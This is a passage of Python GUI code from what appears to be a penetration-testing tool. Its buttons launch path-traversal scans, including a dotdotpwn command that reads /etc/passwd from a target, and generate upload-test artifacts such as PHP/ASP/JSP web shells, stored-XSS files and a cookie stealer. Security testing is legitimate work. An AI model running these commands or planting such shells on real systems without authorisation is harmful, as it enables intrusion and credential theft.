            ("Dotdotpwn Path Traversal", "web_dotdotpwn",
             "if command -v dotdotpwn >/dev/null 2>&1; then dotdotpwn -m http -h {TARGET_HOST} -f /etc/passwd -k root -q 2>&1 | tee {SAFE_TARGET}_dotdotpwn.txt; else echo '[!] dotdotpwn not installed'; fi"),
            ("Nuclei LFI Templates", "web_lfi_nuclei",
             "nuclei -u '{TARGET}' -tags lfi -o {SAFE_TARGET}_lfi_nuclei.txt"),
        ]

        for i, (name, btn_id, cmd) in enumerate(lfi_tools):
            btn = self.create_editable_button(name, btn_id, cmd)
            lfi_layout.addWidget(btn, i // 2, i % 2)

        lfi_card.layout().addLayout(lfi_layout)
        layout.addWidget(lfi_card)

        # ── File Upload Testing ───────────────────────────────────────────────
        # Generates standard upload-test artifacts locally for manual upload.
        upload_card = self.create_card("📤 File Upload Testing")
        self._init_collapsible_groupbox(upload_card, "web_upload_card")
        upload_desc = QLabel(
            "Generate file-upload test artifacts in <output>/upload_tests/ and get a copy-paste "
            "PoC for each. Files are written locally for you to upload manually against authorised "
            "targets — nothing is sent. EICAR proves AV/scanning gaps; the shells prove RCE with a "
            "benign command (id/whoami)."
        )
        upload_desc.setWordWrap(True)
        upload_desc.setObjectName("autoDesc")
        upload_card.layout().addWidget(upload_desc)

        upload_layout = QGridLayout()
        upload_layout.setSpacing(12)
        upload_tools = [
            ("EICAR AV Test Files", self.upload_eicar),
            ("PHP Web Shell (+variants)", self.upload_php_shell),
            ("Image/PHP Polyglot", self.upload_php_polyglot),
            ("ASP / ASPX / JSP Shells", self.upload_asp_jsp_shells),
            ("SVG / HTML Stored XSS", self.upload_svg_html_xss),
            ("Cookie Stealer (Collaborator)", self.upload_cookie_stealer),
            (".htaccess / web.config Bypass", self.upload_handler_bypass),
            ("Bad-Filename Cheatsheet", self.upload_filename_cheatsheet),
        ]
        for i, (name, handler) in enumerate(upload_tools):
            btn = QPushButton(name)
            btn.setObjectName("secondaryButton")
            btn.setMinimumHeight(42)
            btn.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
            btn.clicked.connect(handler)
            upload_layout.addWidget(btn, i // 2, i % 2)

        upload_card.layout().addLayout(upload_layout)
        layout.addWidget(upload_card)

        layout.addStretch()
        
        return scroll
